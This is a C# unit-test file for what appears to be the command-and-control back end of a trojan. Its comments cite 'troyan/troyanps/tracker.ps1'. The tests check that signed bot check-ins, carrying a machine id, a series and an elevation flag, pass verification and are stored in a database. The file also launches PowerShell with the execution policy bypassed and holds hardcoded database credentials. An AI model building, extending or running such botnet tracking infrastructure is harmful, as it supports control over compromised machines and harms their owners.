using System.Diagnostics;
using System.Text.Json;
using cp;
using cp.Controllers;
using FluentAssertions;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Configuration;
using model;
using Npgsql;

namespace Tests;

/// <summary>
/// Upsert flow as implemented by <c>troyan/troyanps/tracker.ps1</c>:
/// 1. Build inner JSON: <c>{"id":"…","serie":"…","elevated_number":N}</c> (manual string, not ConvertTo-Json).
/// 2. HMAC-SHA256(secret, UTF-8 inner JSON) → Base64 → HTTP header <c>X-Signature</c> (Generate-Hash).
/// 3. Wrap inner JSON in envelope via EnvelopeIt (SHA-256 → hash + json) → POST body.
/// 4. POST to <c>$server.trackUrl</c> (typically <c>http://{alias}/bot/upsert</c>); SmartServerlUrl may rewrite host.
/// Server (<see cref="BotController.UpsertBotLog"/>) unwraps envelope, re-serializes inner payload, verifies X-Signature, calls upsert_bot_log.
/// </summary>
[TestClass]
public sealed class BotUpsertOperationTests
{
    private const string TestSecretKey = "YourSecretKeyHere";

    private static BotController CreateBotController(IConfiguration? configuration = null)
    {
        var cache = new MemoryCache(new MemoryCacheOptions());
        var cfg = configuration ?? new ConfigurationBuilder().Build();
        return new BotController(null!, cfg, cache);
    }

    /// <summary>Same shape as tracker.ps1 do_tracker before EnvelopeIt.</summary>
    private static string BuildTrackerInnerJson(string id, string serie, int elevated) =>
        "{\"id\":\"" + id + "\",\"serie\":\"" + serie + "\",\"elevated_number\":" + elevated.ToString(System.Globalization.CultureInfo.InvariantCulture) + "}";

    private static string? RunTrackerCryptoScript(string innerJson, string operation)
    {
        var scriptPath = Path.Combine(AppContext.BaseDirectory, "BotUpsertTrackerCrypto.ps1");
        if (!File.Exists(scriptPath))
            return null;

        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments =
                $"-NoProfile -ExecutionPolicy Bypass -File \"{scriptPath}\" -InnerJson {QuoteArg(innerJson)} -SecretKey {QuoteArg(TestSecretKey)} -Operation {operation}",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using var proc = Process.Start(psi);
        if (proc == null)
            return null;

        var stdout = proc.StandardOutput.ReadToEnd();
        var stderr = proc.StandardError.ReadToEnd();
        proc.WaitForExit(30_000);
        if (proc.ExitCode != 0)
            throw new InvalidOperationException($"PowerShell failed ({proc.ExitCode}): {stderr}");

        return stdout.Trim();
    }

    private static string QuoteArg(string value) =>
        "\"" + value.Replace("\"", "\\\"") + "\"";

    [TestMethod]
    public void TrackerInnerJson_DeserializesToBotLogRequest()
    {
        var inner = BuildTrackerInnerJson("machine-abc", "serie-1", 1);
        var req = JsonSerializer.Deserialize<BotLogRequest>(inner, BotUpsertSigning.UpsertJsonOptions);

        req.Should().NotBeNull();
        req!.Id.Should().Be("machine-abc");
        req.Serie.Should().Be("serie-1");
        req.ElevatedNumber.Should().Be(1);
    }

    [TestMethod]
    public void TrackerFlow_EnvelopeAndSignature_PassServerVerification()
    {
        var inner = BuildTrackerInnerJson("bot-42", "track-serie", 0);
        var envelope = BotUpsertSigning.BuildEnvelope(JsonSerializer.Deserialize<BotLogRequest>(inner, BotUpsertSigning.UpsertJsonOptions)!);
        var xSig = BotUpsertSigning.ComputeXSignature(inner, TestSecretKey);

        var ctrl = CreateBotController();
        var parsed = ctrl.UnEnvelope<BotLogRequest>(envelope);
        var canonical = JsonSerializer.Serialize(parsed, BotUpsertSigning.UpsertJsonOptions);

        canonical.Should().Be(inner);
        BotUpsertSigning.VerifyXSignature(canonical, xSig, TestSecretKey).Should().BeTrue();
    }

    [TestMethod]
    public void PowerShell_TrackerGenerateHash_MatchesCSharp()
    {
        var inner = BuildTrackerInnerJson("ps-cross-check", "s", 1);
        string? psHmac;
        try
        {
            psHmac = RunTrackerCryptoScript(inner, "Hmac");
        }
        catch (Exception ex)
        {
            Assert.Inconclusive($"PowerShell not available: {ex.Message}");
            return;
        }

        if (psHmac == null)
        {
            Assert.Inconclusive("BotUpsertTrackerCrypto.ps1 not found beside test assembly.");
            return;
        }

        var csHmac = BotUpsertSigning.ComputeXSignature(inner, TestSecretKey);
        psHmac.Should().Be(csHmac);
    }

    [TestMethod]
    public void PowerShell_EnvelopeIt_ProducesValidServerEnvelope()
    {
        var inner = BuildTrackerInnerJson("env-check", "ser", 0);
        string? envelopeJson;
        try
        {
            envelopeJson = RunTrackerCryptoScript(inner, "Envelope");
        }
        catch (Exception ex)
        {
            Assert.Inconclusive($"PowerShell not available: {ex.Message}");
            return;
        }

        if (envelopeJson == null)
        {
            Assert.Inconclusive("BotUpsertTrackerCrypto.ps1 not found beside test assembly.");
            return;
        }

        var envelope = JsonSerializer.Deserialize<EnvelopeRequest>(envelopeJson, BotUpsertSigning.UpsertJsonOptions);
        envelope.Should().NotBeNull();
        envelope!.Json.Should().Be(inner);
        envelope.Hash.Should().Be(BotUpsertSigning.ComputeEnvelopeContentHash(inner));

        var ctrl = CreateBotController();
        var back = ctrl.UnEnvelope<BotLogRequest>(envelope);
        back.Id.Should().Be("env-check");
    }

    [TestMethod]
    public async Task UpsertBotLog_InvalidSignature_ReturnsUnauthorized()
    {
        var env = BotUpsertSigning.BuildEnvelope(new BotLogRequest { Id = "x", Serie = "y", ElevatedNumber = 0 });
        var ctrl = CreateBotController();

        var result = await ctrl.UpsertBotLog("default", "127.0.0.1", "not-a-valid-signature", env);

        result.Should().BeOfType<UnauthorizedObjectResult>();
    }

    [TestMethod]
    public async Task UpsertBotLog_TamperedEnvelopeHash_ThrowsBeforeDatabase()
    {
        var inner = BuildTrackerInnerJson("tamper", "s", 0);
        var env = BotUpsertSigning.BuildEnvelope(JsonSerializer.Deserialize<BotLogRequest>(inner, BotUpsertSigning.UpsertJsonOptions)!);
        env.Hash = Convert.ToBase64String(new byte[32]);
        var xSig = BotUpsertSigning.ComputeXSignature(inner, TestSecretKey);
        var ctrl = CreateBotController();

        var act = async () => await ctrl.UpsertBotLog("default", "10.0.0.1", xSig, env);

        await act.Should().ThrowAsync<InvalidOperationException>().WithMessage("*Invalid hash*");
    }

    [TestMethod]
    public async Task UpsertBotLog_ValidTrackerPayload_ReturnsOk_WhenPostgresAvailable()
    {
        const string connectionString = "Host=127.0.0.1;Port=5432;Database=hephaestus;Username=tss;Password=123";
        if (!await CanConnectPostgresAsync(connectionString))
            Assert.Inconclusive("Local Postgres (hephaestus/tss) not reachable; skip integration upsert test.");

        var cfg = new ConfigurationBuilder()
            .AddInMemoryCollection(new Dictionary<string, string?> { ["ConnectionStrings:Default"] = connectionString })
            .Build();
        var ctrl = CreateBotController(cfg);

        var inner = BuildTrackerInnerJson($"test-{Guid.NewGuid():N}", "mstest-upsert", 1);
        var env = BotUpsertSigning.BuildEnvelope(JsonSerializer.Deserialize<BotLogRequest>(inner, BotUpsertSigning.UpsertJsonOptions)!);
        var xSig = BotUpsertSigning.ComputeXSignature(inner, TestSecretKey);

        var result = await ctrl.UpsertBotLog("default", "192.168.1.50", xSig, env);

        result.Should().BeOfType<OkObjectResult>();
    }

    private static async Task<bool> CanConnectPostgresAsync(string connectionString)
    {
        try
        {
            await using var conn = new NpgsqlConnection(connectionString);
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));
            await conn.OpenAsync(cts.Token);
            return true;
        }
        catch
        {
            return false;
        }
    }
}
